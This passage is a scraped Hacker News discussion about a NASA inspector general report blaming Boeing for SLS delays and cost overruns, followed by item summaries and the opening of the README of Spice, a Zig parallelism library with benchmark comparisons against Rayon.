\"cheat codes\" that business students and boardrooms salivate over. Policy that prevents political influence from becoming just another route to investment return. Policy that makes it easier to do incorporation/payroll/taxes/benefits for small businesses. Until these things happen, I see capitalism as just one more flavor of the same old empire-building dynamics that stretch back through time. And not necessarily the winning one. Selling the industrial base of the United States economy to the Communist Party of China in order to pump the assets of wealthy Americans was a real six dimensional chess move. I suppose we'll see how it turns out. reply whatshisface 17 hours agorootparentI didn't actually mention private ownership, only what might be called the right of free assembly. Also, for what it is worth, individual players in the market obviously want to become literal kings. They're \"capitalists\" but not \"capitalist ideologists.\" Capitalist ideologists are people like Milton Friedman, who was not a fan of monopoly and who was himself not much of a businessman. reply schmidtleonard 17 hours agorootparentSo they aren't true capitalists? Why does that sound familiar? My contention with the likes of Milton Friedman isn't that he enjoyed monopolies, it's that his policies (and those of capitalists by any definition I have heard put on the field) tend to support and encourage the formation of monopolies. Markets are full of natural anti-competitive forces (again, just ask any investor about moats) and if you don't have a plan to stomp them out, markets just devolve back into the world's 500th mechanism for the people on top to extract rents from the people on the bottom. As a side effect, the monopolies grow into the same bureaucratic monstrosities they claim to be the cure for. Exhibit A: Boeing, per TFA. reply whatshisface 16 hours agorootparentBoeing is a government-dependent monopoly, and Friedman argued convincingly that pretty much all long-lasting monopolies were too. They achieve regulatory capture and that's that for competition. Also, it was true both times you heard it. Brezhnev had no intention of \"building communism.\" :-) reply HPsquared 17 hours agorootparentprevFree assembly is gradually being chipped away in the West. reply whatshisface 17 hours agorootparentOur rights can't be eroded, only infringed. :-) reply quotemstr 18 hours agorootparentprevThere's no cure though. You can't fix organizations infested with politicians. They're too entrenched. They have an advantage: you, rare competent person, have to focus on both the engineering and the organizational dynamics, whereas these creatures, since they don't believe in world of atoms outcomes, can spend 100% of their time on schemes and on getting rid of gadfly types like you. Progress depends on creative destruction, not internal reform. The only way we maintain or advance quality as a society is to enable the continual creation of new institutions to compete with sclerotic and terminally politician-infested ones. When you artificially prop up the latter, you curtail progress overall. reply nine_k 18 hours agorootparentSo, would you prefer the space division of Boeing to crash and burn, and be replaced with something else entirely? Where would it come from? What to do with other important Boeing space contracts, like, say, X-37? reply ggernov 17 hours agoparentprevnext [2 more] [flagged] nvy 15 hours agorootparentnext [2 more] [flagged] userbinator 15 hours agorootparentDEI wasn't a thing 60 years ago. reply dgfitz 18 hours agoparentprev> Welders are highly qualified and well-paid craftsmen. They’re not. You must be one of those people that hears something once and quotes it as gospel. My BIL did that yesterday: “nfl viewership has been down because of all the different platforms, and it’s been trending down for years.” As it so happens, last year was their second-best year of ratings since ratings were tracked. But, it fit his narrative, facts be damned. “We all see the welding school advertisements: Make Over $100,000 As a Welder! And while it’s true that skilled welders are among the most sought-after workers in the job market, the average welder is bringing in $48,000 per year, a far cry from six figures.” [0] [0] https://primeweld.com/blogs/news/how-much-do-welders-make-in.... reply windexh8er 16 hours agorootparentThis is 1000% false and misleading. My Dad was a journeyman machinist and many of his friends were highly sought after welders in the area we lived. These guys could weld anything anywhere and exceed quality criteria. Welding is an art and at a certain required level of performance it's not something you teach, but find the folks who have the drive to be that good and want to weld for high precision requirements. What you've linked is a run of the mill welder. My Dad machined classified parts for USG and NASA. When they'd get those jobs they would go to the guys who had a reputation to be able to produce the die to the spec required. Messing up a multi-ton die of a specific quality could cost hundreds of thousands of dollars in lost material and time. You don't make $48k on those tolerances, even back in the 80s. reply dgfitz 5 hours agorootparentI'm not sure how to address this. I sent a link that says \"sure some people make 100k+\" and your dad was one of them. The link ALSO said \"most people make half of that\" and your anecdote doesn't refute anything. Your dad had a a trade skill, and obtained a clearance. Congrats, he is an outlier. Nothing I said was false or misleading. reply nothercastle 18 hours agorootparentprevI can assure you that skilled welders like the ones you need for aerospace applications are rare and valuable. The welding techniques and standards are much higher than your average welding application reply dgfitz 5 hours agorootparentI agree with you. 3% of welders make good money. I never disagreed with this. reply ChrisMarshallNY 17 hours agorootparentprevI had a friend who was a welder for nuclear power plants. He got shipped around the country. Not exactly a trade-school C-student. Had a better house than mine, but I’m a cheapskate. reply jtriangle 19 hours agoprevHeadline makes it sound like it's intentional, like Boeing knows the moon's haunted and wants to prevent people from going. Turns out they're just a giant company suckling on the teat of mommy government and have developed severe structural dysfunction that prevents them from effectively executing their plans. reply mihaaly 10 hours agoparentTitle of The Economists article form April: > Can anyone pull Boeing out of its nosedive? Apparently the answer is a sound no. They decided to proudly shoot themselves into the stomach, then mitigating the situation by setting themselves on fire. The inspector general is wrong saying \"blame on the aerospace giant’s mismanagement and inexperienced workforce\". How can someone blame clueless person? The blame is on those putting clueless person there in the first place. Or is the management the most inexperienced and clueless of all for this line of job perhaps?! As suspected for many many years now. Ajh!! reply moffkalast 9 hours agorootparentTo paraphrase the investigators of the average Boeing airliner crash: \"A trained pilot would not have been able to regain control in the required time\" reply tim333 8 hours agorootparentWell, we have new CEO, Kelly Ortberg who started Aug 8th, to give it a go. It looks like they are having a go at correcting some of their more noted flaws - he's an engineer and is going to run things from Seattle. Good luck to him! reply moffkalast 7 hours agorootparentYeah like that'll make any difference. They've had a bean counter in charge for the past 4 years, and another engineer before that who was fired over the 737 Max fiasco. \"CEO changes will continue until morale improves\"? reply throwawayffffas 16 hours agoparentprev> Originally, the EUS was allocated a budget of $962 million and intended to fly on Artemis II, which in January was pushed to no earlier than September 2025. But by the OIG’s estimate, EUS costs are expected to balloon to $2 billion through 2025 and reach $2.8 billion by the time Artemis IV lifts off in 2028. Lets see they were allocated a budget of $962 million in order to deliver in 2025. But now they can deliver in 2028 and they will be paid $2.8 billion. They would have to be stupid to deliver in time. reply orls 6 hours agorootparentExactly - all the anti-Boeing sentiment in the comments here (while deserved) should also be directing some ire at the funding and contract structures being used for these projects (I.e. “cost-plus” contracts). They’re just bad policy if you want the _nominal objectives_ of the project delivered on time and on budget; they have structural incentives for contractors to go over. (It’s pretty clear that delivering the nominal objectives is not what the relevant policy-makers are actually aiming for, though. The cost overruns are the real goal for them, as it’s a kind of pork to steer regional funding) reply grahamjameson 19 hours agoparentprevI do not know the details of their contracts, but assuming these are cost-plus contracts then it may be fair to equate structural dysfunction to intent. reply jaggederest 18 hours agorootparentThe purpose of a system is what it does. Defense contractors extract money from the government, they are not here to enable space travel, they are here to move money from other people's pockets to their own. Any other actions are purely ancillary. And if they can get the money without delivering any result at all, why, they're fine with that. reply nordsieck 16 hours agorootparent> The purpose of a system is what it does. Defense contractors extract money from the government, they are not here to enable space travel, they are here to move money from other people's pockets to their own. Any other actions are purely ancillary. And if they can get the money without delivering any result at all, why, they're fine with that. This is part of the reason why the new era of firm, fixed price contracts at NASA is so important. And why it's so troubling that NASA is having difficulty transitioning SLS contractors to such contracts for later (Artemis V+) rockets. reply wmf 15 hours agorootparentOld Space companies will never adopt fixed price. NASA just needs to drop them. reply JumpCrisscross 13 hours agorootparent> Old Space companies will never adopt fixed price Starliner is fixed cost. reply thanksgiving 10 hours agorootparent> Starliner is fixed cost. It sounds like you agree that Boeing is failing to adopt to fixed cost? Just from pop culture, isn't starliner that thing that leaves people stranded for a year after making them shed \"excess\" baggage for a supposedly weeklong(?) trip? Also from https://en.wikipedia.org/wiki/Boeing_Starliner > Boeing has lost more than $1.5 billion in budget overruns on the Starliner project which has been marred by delays, management issues and engineering challenges. The price paid per flight has also drawn criticism from NASA's inspector general and from observers who point to significantly lower costs on the competing Crew Dragon. reply JumpCrisscross 6 hours agorootparent> It sounds like you agree that Boeing is failing to adopt to fixed cost? “Will never adopt” and is failing to adopt and adapt to are miles apart. reply nradov 15 hours agorootparentprevThat sounds good, until it leaves NASA entirely dependent on SpaceX as a single supplier. For better or worse, there don't seem to be any other companies (old or new) that are able to successfully execute on huge fixed-price contracts. reply nordsieck 15 hours agorootparent> For better or worse, there don't seem to be any other companies (old or new) that are able to successfully execute on huge fixed-price contracts. Northrup Grumman seems to be doing a pretty good job with Cygnus. And ULA seems to be doing alright with NSSLv2 (although it sounds like they may have had to give up a launch or two due to Vulcan delays). reply Gud 13 hours agorootparentprevNo, but there will be. Besides SpaceX there is also Rocketlab who has a CEO rocket nerd in charge. reply kaliqt 8 hours agorootparentSo that's two nerds total. reply Ajedi32 5 hours agorootparentStoke Space also has a pretty huge rocket nerd at the helm[1]. And of course there's Blue Origin (even though they seem to be taking forever). The industry has been flourishing lately, though (with the possible exception of Blue Origin) it'll be a long time before these younger companies produce anything capable of rivaling Falcon 9, let alone Starship. [1]: https://everydayastronaut.com/stoke-space/ reply nordsieck 3 hours agorootparent> And of course there's Blue Origin (even though they seem to be taking forever) Ever since Bezos installed David Limp as CEO, it seems like they've been able to ship stuff. It's hard to know if he was set up for success by his predecessor, but their older no press policy prevented anyone from knowing it, or if he changed the company culture for the better. Regardless, it appears like Blue Origin is likely to launch New Glenn this year. Or, at least the DoD thinks it's likely enough that they agreed to onramp Blue Origin to NSSLv3 (pending a successful launch). > it'll be a long time before these younger companies produce anything capable of rivaling Falcon 9 I don't think it'll be that long. * Blue Origin's New Glenn should launch in 2024-2025. * RocketLab's Neutron should launch in 2025-2027. * Relativity's Terran R should launch in 2026-2028. That's remarkably soon. Of course, as you point out, Starship should be operational quite soon. It'll be exciting to see how things shake out. My personal opinion is that SpaceX will move to payload based pricing, somewhat akin to their current rideshare pricing. I'm just pulling numbers out of the air, but something like $10m + $3m/tonne. That way they can compete for smaller payloads while also being paid appropriately for launching really heavy stuff. However it ends up, I'm sure pricing will be heavily influenced by the competition when it comes out. reply Gud 2 hours agorootparentprevTrue, I'm also stoked(sorry) about stoke space. One thing I really like about Rocket Lab though, is how diversified they are. reply wmf 15 hours agorootparentprevSierra and Blue Origin are coming. reply nradov 15 hours agorootparentprevThese are not cost-plus contracts for the most part. Boeing has incurred huge losses on fixed-price contracts with NASA. https://arstechnica.com/space/2023/10/boeing-says-it-cant-ma... reply quantified 19 hours agoparentprev\"Moss on my teeth is hindering my getting a date\" reads the same. I think different people will get different interpretations. reply a1445c8b 19 hours agorootparent“NASA considering sending FlossX to extract moss from teeth” reply dylan604 17 hours agoparentprevIt only reads that way if you're being very very generous and have lived under a rock for the past few years so that you've not seen any other information about Boeing. reply ClumsyPilot 19 hours agoparentprev> Turns out they're just a giant company That should die. This is what happens when you allow monopolies, you can’t even let them die because you’ll be left with nothing. They face no competition , and have no reason to improve reply whatshisface 18 hours agorootparentThe \"left with nothing\" fear is unfounded. All of their assets would be bought up by investors seeking to do the same thing but the right way; a factory has value and somebody will want it. reply chiefalchemist 17 hours agorootparentPerhaps. But now imagine trying to be the politician(s) selling the \"let'em die\" idea. Most voters will be thinking, \"What if my company is next to go?\" and will vote accordingly. Thus there are few very politicians willing to take the high road. reply mc32 18 hours agoparentprevI usually despise stack rank, but it looks like there are times when it's needed. Maybe companies should mostly eschew it for other methods, but run it once per decade and flush out all the dead weight, of course, including management. reply jordanb 17 hours agorootparentThe problem is that stack ranking rewards the political actors and not people who heads down focus on their work. This is especially true when the organization has already been taken over by the parasites. I think Boeing needs to immediately fire everyone in leadership positions with a finance or consulting background, unless they're under the CFO. Everyone needs to be reviewed to make sure they have the background to lead their team. If the leader can't do the work of the people at least one and ideally two levels under them they need to be fired for incompetence. Basically Boeing needs rebuilt from the top down as a company of doers. reply mangamadaiyan 17 hours agorootparentprevWho stack-ranks the management? How? reply mc32 16 hours agorootparentYou would have employees evaluate the managers. You can have outside consultants also evaluate the health of the management --but that can get tricky. reply mangamadaiyan 8 hours agorootparentNeither approach works. Engineers (management are also employees, right?) ranking management erodes management authority, and management will never stand for it. Outside consultants are usually hired with a fixed agenda - the rotten eggs almost always get to stay. Stack ranking is evil, period. reply mc32 6 hours agorootparentIt is, but it may be periodically necessary to get rid of dead weight and extirpate those who’ve risen to their level of incompetence. I'm not advocating stack ranking for yearly review but rather a quintennial or decennial event to clean-house. In other words, a mechanism to avoid what happened to Boeing, Intel, Yahoo, and what is happening to Google and others. 360 reviews obviously allows orgs to get fat and carry bloat. reply trentnix 18 hours agoprevPournelle’s Iron Law of Bureaucracy claims another victim. In any bureaucracy, the people devoted to the benefit of the bureaucracy itself always get in control and those dedicated to the goals that the bureaucracy is supposed to accomplish have less and less influence, and sometimes are eliminated entirely. RIP Jerry. A Step Farther Out is one of my all time favorites. reply silexia 4 hours agoparentThis is why bankruptcy is such a good thing in private industry. And we need a mechanism like bankruptcy for government agencies. reply umanwizard 19 hours agoprevDoes anyone actually seriously believe the U.S. will land a person on the moon in 2025? This is the country that takes decades to open a new subway station. reply cco 12 hours agoparentThere is a very interesting video from Smarter Every Day that suggests everyone knows that the SLS is physically incapable of landing on the moon as designed but nobody seems to be mentioning it. https://www.youtube.com/watch?v=OoJsPvmFixU reply the_duke 8 hours agorootparentYou got things very confused. SLS is the thing that launches Orion, which is the capsule with humans inside. SLS isn't capable enough to get that capsule into lunar orbit. Orion also isn't landing by itself though, it just transfers the astronauts to a landing vehicle (SpaceX Starship, currently...), which lands and then starts again. The thing brought up in that video is that the rendezvous point should probably be in lunar orbit, but isn't. reply imtringued 46 minutes agorootparentUnfortunately there is no alternative to Orion so far. No, Starship may carry people to the moon, but getting them off the moon isn't possible. The lunar Starship won't return to LEO. The closest thing you could do is send another Starship and do the same NRHO docking that SLS+Orion is already doing and then instead of aerobraking, do a deceleration burn to get an LEO capture. That is the only way without Orion. For better or worse, Orion in NRHO is indispensable. reply preisschild 12 hours agorootparentprevHLS is for landing, but nobody seems to have any plan on how many resources it will take to get Starship HLS there with a full enough tank reply moffkalast 9 hours agorootparentSpaceX is probably just gonna brute force it by launching 20 times to refuel it, they see it as testing out the hardware anyway. reply akira2501 19 hours agoparentprevWe're the only nation that has ever done it. It seems like unchecked graft is our current main problem. In the scope of all problems of returning people to the Moon this is both expected and the easiest to deal with. reply okanat 19 hours agorootparentWhen that was happening, the US was spending ungodly amount of money to show Soviets that they can take ~a nuke~ sorry people to the Moon and back. Boeing, Lockheed etc. were still engineering oriented companies full of projects and management opportunities for innovative and risk-taking people. Starting with the Reagan era, they are now emptied out rent seekers full of car salesmen who look up to Jack Welch as a role model. reply _moof 15 hours agorootparentAnd there were a lot more players in aerospace then too. Apart from Boeing and Lockheed, Apollo also involved North American Aviation, Grumman, Rocketdyne, General Dynamics, Pratt & Whitney, Douglas, TRW, and Bell. Of those, only General Dynamics and Pratt & Whitney have not been acquired or merged into other companies. reply knowaveragejoe 3 hours agorootparentAre there not _far_ more players in aerospace today than what you listed? Maybe those of today are not at the scale of the companies you listed at the height of the cold war, but we're really in a new era of space industry. reply _moof 3 hours agorootparentPeople making cubesats? Sure. Companies that can build moonshot hardware, though, are far more scarce. reply knowaveragejoe 3 hours agorootparentprev> Boeing, Lockheed etc. were still engineering oriented companies full of projects and management opportunities for innovative and risk-taking people. Starting with the Reagan era, they are now emptied out rent seekers full of car salesmen who look up to Jack Welch as a role model. To be fair, Boeing, Lockheed etc won't be the decisive players putting humans back on the moon from the US. It'll be smaller and scrappier players more akin to startups. reply okanat 2 hours agorootparentThis is where the \"ungodly\" funds of Cold War make the difference. There is little incentive in the US government to spend at once as much and take political risk as much as it did back then. reply umanwizard 19 hours agorootparentprev> We're the only nation that has ever done it The USA of the 1960s was very different from the one that exists today. reply cqqxo4zV46cp 19 hours agorootparentprevWhat “the US” did 50+ years ago has absolutely no say in what “the US” can do now. reply whatshisface 18 hours agorootparentOur GDP is about 50x higher now than it was then, in real terms. reply scottyah 18 hours agorootparentGDP in such a services-based economy is unreliable as a metric for the ability to produce, since just moving the money around now contributes to it. reply pfdietz 18 hours agorootparentprevMore like a factor of 6.6. https://fred.stlouisfed.org/series/GDPC1 reply hnthrowaway0315 14 hours agorootparentprevThe spirit is different. reply desperate 18 hours agorootparentprevYeah but money can't pay for skill that doesn't exist anymore. reply akira2501 18 hours agorootparentI really think it's worth it to go back and read the original Apollo program proposals, technical conference memos, and NASA administrative plans to see the history of the program and how something like this gets off the ground in the first place. The US was not a bastion of technical capability or well educated people in the 1950s. To say that the \"skill doesn't exist anymore\" suggests a misunderstanding of \"where it comes from\" in the first place. You can do the same thing for Apollo as you can for the Shuttle. The process of reading through these histories, from front to back, is incredibly enlightening, and shows just how with determination alone you can build something like this from scratch. That being said.. it really also helps if there's a dual purpose use for the military. reply sgnelson 17 hours agorootparentI think you drastically underestimate the influence that World War 2 had on up-skilling a technological workforce in the United States. I know a handful of people who's fathers or relatives went from farm boy to a radio technician with basic electrical engineering skills (or a similar story) because of the war. The effect that war had on the technological progress, including learning the skills of how to manage a not-so-simple idea like going to the moon into reality was incredible, and a direct spinoff from the bureaucracy created during the war. reply Dalewyn 15 hours agorootparentMost people want to deny it, but both Apollo and Space Shuttle were the results of there being a Fucking War(tm) that had to be won at any cost. Nowadays, that specific motivator is squarely with the Chinese. reply Rinzler89 14 hours agorootparentBut what wars has China started though in order for us to be afraid of them? If I look at the current score board in the last decades, US has invaded more counties than China (have they found those WMDs yet?), yet somehow we're (us non Americans in the west) are supposed to fear China, because reasons? Honestly, my biggest enemy right now is my own EU government who has done the biggest damage to our country and because of them there's a shortage of doctors, teachers, etc, high inflation, stagnating wages, high taxes, unaffordable housing, etc. We have done that ourselves, not China. Whatever bad things China is doing in their own back yard is much less damaging to us than all those things I've just mentioned yet somehow we're expected to fear China. Aren't these foreign boogie men convenient finger pointing to our corrupt and incompetent leadership: \"Hey, don't look at us for your plummeting standard of living, look at Covid, Russia, China, immigrants with beards, The Loch Ness Monster, etc\". Give me a break. reply Paradigma11 10 hours agorootparentChina has made it pretty clear that it is planning to grow into a dominant position and then invade Taiwan and claim the 9 dotted line. While it is true that it is globally not very active in military terms I am pretty sure that this is going to change when more and more economic partners are realizing that there is no more money coming from China and it is cheaper to just default on their debt and nationalize Chinese interests. reply defrost 9 hours agorootparent> and then invade Taiwan and claim the 9 dotted line. FWiW : The Republic of China (ROC), or simply China, was a sovereign state based in mainland China from 1912 until its government's retreat in 1949 to Taiwan, where it is now based. The nine-dash line, also referred to as the eleven-dash line by Taiwan, is a set of line segments on various maps that accompanied the claims of the People's Republic of China (PRC, \"mainland China\") and the Republic of China (ROC, \"Taiwan\") in the South China Sea. A 1946 map showing a U-shaped eleven-dash line was first published by the Republic of China government on 1 December 1947. The area has always been claimed, whether by the ROC, the PRC, or indeed under Puyi, who had reigned as the Xuantong Emperor of the Qing dynasty. The issue is that \"Western\" sea faring nations self selected themselves as arbitrators of global borders, including those of regions with governance dating back 4,000 years. On 12 July 2016, an arbitral tribunal organized under the United Nations Convention on the Law of the Sea (UNCLOS) concluded that China had not exercised exclusive and continuous control over the [ dashed zones ] Over 20 governments have called for the ruling to be respected. It was rejected by eight governments, including China (PRC) and Taiwan (ROC). https://en.wikipedia.org/wiki/Nine-dash_line https://en.wikipedia.org/wiki/Republic_of_China_(1912%E2%80%... China and Taiwan have always claimed the regions within the nine dashed line. reply Paradigma11 9 hours agorootparentIt is somewhat disingenuous to say that Taiwan claims those regions. China has made it clear that any abdication of those claims would be seen as a move towards independence and result in invasion. Similar to the Chinese claims that the British never brought democracy to HongKong while China threatened invasion if any such thing had happened. reply Rinzler89 10 hours agorootparentprev>China has made it pretty clear that it is planning to grow into a dominant position and then invade Taiwan and claim the 9 dotted line. Populist words are cheap. I'll start blaming China for warmongering when they actually put boots on the ground. Meanwhile how many dorne strikes has the US made in the middle east without any consequences? reply Paradigma11 9 hours agorootparentBut the massive buildup of the Chinese Navy and their paramilitary maritime militias are not cheap. In the end the only thing that matters is if China invades Taiwan there will be war, if it doesnt there wont be. Better be prepared for the first case. reply Dalewyn 9 hours agorootparentprevWars don't have to be waged with rubber and lead; actually, fighting a war is about the worst possible way to wage one. No, China is waging a war against the entire world in the smartest way imaginable, and most of us don't even realize it: They have their financial tendrils in all of our economies, down to the core elements and throughout the peripheries. Nearly everything has at least some degree of Chinese monies and thus influence now. It's really only a matter of time until Pax Americana comes crashing down because we are all far too busy complaining about our navels. Be prepared, because Pax Sino isn't going to be kind to most of us. reply Rinzler89 7 hours agorootparent>No, China is waging a war against the entire world in the smartest way imaginable, and most of us don't even realize it: IDK man, being drone striked from above by the USAF seems far worse to me than whatever China could be doing to me, but I'll bite. >They have their financial tendrils in all of our economies, down to the core elements and throughout the peripheries. Nearly everything has at least some degree of Chinese monies and thus influence now. More influence that the world reserve currency which last time I cheeked is the USD and only the US has the printer for it? reply Jensson 13 hours agorootparentprevPowerful undemocratic countries are scary, if they are willing to oppress their own people they are for sure willing to oppress other people as well. reply Rinzler89 13 hours agorootparent>Powerful undemocratic countries are scary Just like all the other undemocratic dictatorships the west is \"friends\" with and turn a blind eye to their anti human rights actions? reply zo1 11 hours agorootparentThere is no reasoning about this. Government as an entity (especially the \"Rainbow\" West ones like the EU and US) is literally schizophrenic or crazy or has multiple personality disorder (that's the best analogy I can come up with). Their laws are not internally consistent, their words don't match their actions, they entertain conflicting and opposing priorities, they actively do things to their own detriment, they promote the well-being of everyone but their own citizens, they can't get consensus on anything from their own populace, and they blame everyone and themselves too at the same time for their own failings. They admit their own failings by showing us who they are \"allergic\" to. So yes, China may be a \"bad guy\", but they're painted as a boogeyman for a reason. reply jazzyjackson 18 hours agorootparentprevApollo really was a rare alignment of motivations, unbounded optimism meets existential fear, ie, \"humanity can migrate into the stars\" overlapping with \"if we don't do this the commies win first strike capability\", seems unlikely to re-occur. reply darth_avocado 18 hours agorootparentprevOhh but it can. The downfall of Boeing has literally been because it prioritized not paying money for skill that definitely exists. reply xtracto 6 hours agorootparentSomething else... US current political climate vs immigrants doesn't help. In addition to the life prospects of potential immigrants. I'm a drop on the ocean only, but my case is the one I have: PhD in Computer Science, highly specialized and have lived and worked around the world , but there's not enough that attracts me to living in the US. Its health system issues, the animosity against minorities and immigrants and the lack of reasonable immigration paths for professionals make it unsexy. And as I said I'm literally nobody. How would the US attract real post Ww2 talent? reply umanwizard 5 hours agorootparentThere is definitely animosity towards migrants in the U.S. but I’m not convinced it’s any worse than in any other country with a large immigrant population. Look at the huge advances made recently by far-right parties in Europe for example, or the riots in England. > lack of reasonable immigration paths for professionals getting a visa is the hardest part, but doable if you’re a bit lucky. Once you have the visa, getting permanent residency after a few years and ultimately citizenship is relatively straightforward, IF you’re not from one of a few countries with large numbers of immigrants to the U.S.: mainly Mexico, the Philippines, China and India. It seems from your profile that you’re Mexican so yeah, getting permanent status in the U.S. would take a really long time even if you got a visa. This is one of the biggest competitive disadvantages of the U.S. currently: making it unreasonably hard for skilled people to immigrate, compared to places like Canada or Europe. But I think it’s an exaggeration to say there’s no reasonable path. reply darth_avocado 2 hours agorootparentIt can be unreasonable, like you mentioned, if you originate from specific countries. For sectors like Defense, Aerospace etc., you literally can't work unless you are a permanent resident or a citizen. Which means, even if you do have a visa, without a path to permanent immigration, you can't really contribute in those sectors, making it unreasonable. reply umanwizard 2 hours agorootparentTrue, that is a fair point in the context of the moon discussion. reply JumpCrisscross 13 hours agorootparentprev> money can't pay for skill that doesn't exist anymore Expert welders can be trained in years. We could easily buy an Apollo-era generation of aerospace welders if we wanted them. reply knowaveragejoe 3 hours agorootparentprevThe depth of breadth and skill is still there, even moreso today. Whether Boeing will catalyze that is in question, not the fundamentals. reply justinclift 17 hours agoparentprevIf they keep awarding contracts to SpaceX for getting the needed pieces done, then it's possible. :) At least until SpaceX starts to feel a bit too comfortable... o_O reply dylan604 17 hours agorootparentThat doesn't really seem like something SpaceX will do any time soon though. After all, they want Mars. The moon is just wasting time to SpaceX. So until SpaceX achieves Mars, they have too much to do to become too comfortable. Of course, I just sit on a couch offering opinions. reply nordsieck 16 hours agorootparent> That doesn't really seem like something SpaceX will do any time soon though. After all, they want Mars. The moon is just wasting time to SpaceX. IMO, the opposite is true. 1. SpaceX needs money to fund their Mars dreams. And the HLS contract is a couple billion dollars that they can grab. 2. Getting to the moon with NASA will dramatically help SpaceX because NASA will be working with them to crew rate the lander for everything except taking off from and landing on Earth. 3. Developing HLS Starship will let SpaceX begin to offer private Lunar missions. 4. Mars is really tough. It's far away, it's only feasible to travel there once every 2 years, it's very difficult to land, and it'll be super hard to get in-situ resource utilization - basically harvesting resources from Mars to generate enough propellant that a return trip to Earth is possible. I'm sure SpaceX will probably send some rockets to Mars. But the first few sets will be figuring out hwo to land and maybe set up ISRU. And in the meantime, the Moon is a great venue for SpaceX to train systems and earn a bit of money. reply Yeul 17 hours agoparentprevIf America can make space a crusade again instead of a business sure. The Chinese are currently in their Apollo phase in which every engineer dedicates their life to the mission. reply davidw 19 hours agoparentprevThere are no NIMBYs on the moon, so maybe? reply kevin_thibedeau 14 hours agoparentprevThat was always a bullshit date. No different than elder Bush's Mars in 2030. 2028, maybe if everything goes well with Starship, and the suits. Their lunar variant is still a disaster waiting to happen without a better design. We've seen how Starship destroys a launch pad with ill-conceived flame diversion. How is it going to land on unprepared regolith without toppling in its own crater or destroying the engines with rebounding shrapnel? SLS is also supposed to somehow fit into the picture which is still not tested in any way resembling the baby steps Apollo took. reply mr_toad 13 hours agorootparentStarship didn’t destroy anything, that was the booster, and they’re not landing a 33 engine booster on the Moon. reply boxed 12 hours agorootparentprevSuper Heavy isn't going to the moon. Also, the moon has less gravity. WAY LESS. I think those two things combined means your logic is off by at least 3 orders of magnitude. reply wormlord 1 hour agorootparentprevWhy is this being downvoted? These are all valid concerns. reply inglor_cz 9 hours agorootparentprev\"We've seen how Starship destroys a launch pad with ill-conceived flame diversion. How is it going to land on unprepared regolith without toppling in its own crater or destroying the engines with rebounding shrapnel?\" Starship has fewer engines than Super Heavy, it likely won't be landing at full throttle either, and lunar lander Starship could have landing legs as well. The lower gravity on the Moon means that you can carry more hardware with you. Maneuvering in 0.16 g is nowhere near as fuel intensive as in 1 g. reply wonderwonder 15 hours agoparentprevI honestly hope so or soon after although I think it unlikely. The psychological shock to the nation & to the world of seeing China do it before us will be immense. It will have indicated a changing of the guard and the decline of America. But I like to think we will. reply pharos92 16 hours agoparentprevWell we're over 1,000 days in to Kamala Harris' $42B universal broadband access program and not a single subscriber has been connected. reply 96 more comments... GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
    "originSummary": [
      "NASA’s Office of the Inspector General (OIG) report blames Boeing’s mismanagement and inexperienced workforce for significant delays and cost overruns in the Space Launch System (SLS) Block 1B development.",
      "The SLS Block 1B budget has escalated from $962 million to an estimated $2.8 billion, with the OIG highlighting inadequate quality management and workforce issues as primary factors.",
      "NASA has agreed with most OIG recommendations, including improving quality management and conducting cost overrun analyses, but rejected financial penalties, opting instead to incentivize good performance."
    ],
    "commentSummary": [
      "NASA's investigation reveals that Boeing's subpar welding and inexperienced technicians have caused significant delays in the Space Launch System (SLS) Core Stage 3, hindering America's return to the moon.",
      "The report highlights that inadequate work order planning and supervision by Boeing led to a seven-month delay in the completion of the Exploration Upper Stage (EUS).",
      "This situation underscores broader issues in the aerospace industry, where management practices and labor shortages are impacting critical projects and timelines."
    ],
    "points": 434,
    "commentCount": 349,
    "retryCount": 0,
    "time": 1723495107
  },
  {
    "id": 41230344,
    "title": "Spice: Fine-grained parallelism with sub-nanosecond overhead in Zig",
    "originLink": "https://github.com/judofyr/spice",
    "originBody": "Spice: Parallelism with sub-nanosecond overhead Spice uses heartbeat scheduling to accomplish extremely efficient parallelism in Zig: Sub-nanosecond overhead: Turning your function into a parallelism-enabled function adds less than a nanosecond of overhead. Contention-free: Threads will never compete (i.e. spin) over the same work. Adding more threads to the system will not make your program any slower, but the extra threads might be completely idle since there's nothing useful to do. The benchmark in the figure above (summing over the nodes in a binary tree) is typically one of the worst cases for parallelism frameworks: The actual operation is extremely fast so any sort of overhead will have a measurable impact. Here's the exact same benchmark in Rayon, an excellent library in Rust which uses work-stealing fork/join: The overhead here is roughly ~15 ns (from 7.48 ns to 22.99 ns) which means that at 4 threads we're \"back\" to the sequential performance - just using four times as much CPU. Luckily we are able to get linear speed-up (in terms of threads) initially. These benchmarks were ran on a c4-standard-16 instance in Google Cloud with 16 cores. Rayon itself shows a nice ~14x speed-up (from 22.99 ns to 1.64 ns) at 16 threads, but compared to the baseline this ends up only being ~4.5x due to the overhead. In comparison, Spice scales slightly worse: It only got ~11x speed-up when going from 1 to 16 threads. However, due its low overhead this is also essentially the speed-up compared to the baseline. (It's not entirely clear why the Zig baseline implementation is twice as fast as the Rust implementation. The compiled assembly (godbolt) show that Rust saves five registers on the stack while Zig only saves three, but why? For the purpose of this benchmark it shouldn't matter since we're only comparing against the baseline of each language.) It becomes even more interesting if we're summing the nodes of a much smaller tree: In this scenario we have a very short duration of our program: The baseline implementation takes 1.56 microseconds in total to run. For some reason the overhead is a bit higher (~19 ns), but more concerningly we see that performance becomes worse the more threads we're adding. At 32 threads it's in total 60 times slower. (In this case we're using 32 threads on a machine which only has 16 cores. It's not given that we would see the same slowdown for a machine with 32 cores. Nonetheless, this scaling behavior is concerning.) The conventional wisdom for parallelism therefore ends up being \"it's not worth it unless you have enough work to parallelize\". The example above is typically presented as a \"bad fit for parallelism\". This is understandable and pragmatic, but in practice it makes it a lot more difficult to actually parallelize your code: What exactly is \"enough work\"? You might need to do a lot of benchmarking with different types of input to understand this. It might be difficult to detect how much work a certain input does. For instance, in our binary tree we don't know the full size of it. There's no obvious way for us to say \"if the tree is small enough, don't run the parallelized code\" since by only looking at the root we don't the size of it. As we've seen, the potential slowdown can be extreme. What if 90% of your workload is like this? As your program evolves and your code does more (or less) things, the definition of \"enough work\" will also naturally change. The goal of Spice is for you to never have to worry about your program becoming slower by making it parallel. If you're looking to maximize the performance you should of course do elaborate benchmarking, but generally with Spice you can add parallelism and there will be practically no overhead. The last example of summing over 1000 nodes behaves as follows in Spice: What's happening here is that it's discovering that the duration is too short so none of the multi-threading kicks in. All the extra threads here are sleeping, giving the cores time to execute other programs. Spice is primarily a research project. Read along to learn more about it, but if you're considering using it in production you should be aware of its many limitations. (See the bench/ directory for more details about these specific 